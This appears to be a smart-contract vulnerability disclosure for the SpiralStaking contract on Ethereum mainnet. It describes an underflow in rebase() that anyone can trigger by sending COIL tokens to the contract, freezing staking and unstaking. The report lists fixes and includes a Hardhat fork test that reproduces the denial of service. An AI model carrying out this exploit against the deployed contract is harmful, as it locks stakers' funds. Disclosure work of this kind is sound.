**Description**\
Contract in scope: [SpiralStaking](https://etherscan.io/address/0x6701E792b7CD344BaE763F27099eEb314A4b4943)  
Vulnerable method: [function rebase() public](https://etherscan.io/address/0x6701E792b7CD344BaE763F27099eEb314A4b4943#code#F1#L56)  
Line of bug: [Coil.mint(address(this), (totalSpiral * index / initialIndex) - Coil.balanceOf(address(this)));](https://etherscan.io/address/0x6701E792b7CD344BaE763F27099eEb314A4b4943#code#F1#L63)  

Malicious or accidental sending of COIL tokens to this contract can lead to **arithmetic underflow** when `Coil.balanceOf(address(this)) > (totalSpiral * index / initialIndex)`.  

Impacts:  
DoS of methods `rebase` and subsequently `stake/unstake` (calls `rebase`), i.e. stakers assets are frozen in the contract.  

Solutions:  
Immediately: In case of this attack, set `epoch.apr` to 0. This ensures that the vulnerable line is not executed and stakers can unstake.  
New contract: Check for underflow with an additional if and only mint if necessary.

**Attack Scenario**\
Anyone with enough COIL tokens can simply send them to the SpiralStaking contract such that `Coil.balanceOf(address(this)) > (totalSpiral * index / initialIndex)`.  
This is all it takes to facilitate the attack.

**Proof of Concept**  
The whole Hardhat mainet fork PoC project is available upon request.  

Here is the relevant typescript test code:
```typescript
import type { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";
import { expect } from "chai";
import { ethers, network } from "hardhat";

import * as contracts from "../../src/types";
import { addBalance_ETH, impersonate, printBalance_ERC20, printBalance_ETH, sendToken_ERC20 } from "./helper";

describe("Attach to external contract", async function () {
  let signer: SignerWithAddress;

  let stakingContract: contracts.SpiralStaking;

  before(async function () {
    // address of external contract must be provided via env. variable
    const contractAddress: string = <string>process.env.CONTRACT_ADDRESS;
    const impersonateAddress: string = <string>process.env.IMPERSONATE_ADDRESS;

    if (impersonateAddress) {
      signer = await impersonate(impersonateAddress);
    } else {
      [signer] = await ethers.getSigners();
    }

    // PoC: fill attacker/signer account with 10 000 COIL
    const contractCoil = "0x823E1B82cE1Dc147Bbdb25a203f046aFab1CE918";
    const holderCoil = "0xAF4264916B467e2c9C8aCF07Acc22b9EDdDaDF33";
    await sendToken_ERC20(contractCoil, holderCoil, signer.address, 10000);
    
    stakingContract = await ethers.getContractAt("SpiralStaking", contractAddress, signer);
  });

  it("DoS attack", async function () {
    // PoC: send 10 000 COIL to staking contract
    const contractCoil = "0x823E1B82cE1Dc147Bbdb25a203f046aFab1CE918"
    await sendToken_ERC20(contractCoil, signer.address, stakingContract.address, 10000);

    // PoC: rebase DoS
    await expect(stakingContract.connect(signer).rebase()).to.be.reverted;

    // skip 10 000 blocks
    await network.provider.send("hardhat_mine", ["0x2710"]);

    // PoC: rebase DoS
    await expect(stakingContract.connect(signer).rebase()).to.be.reverted;
  });
});
```



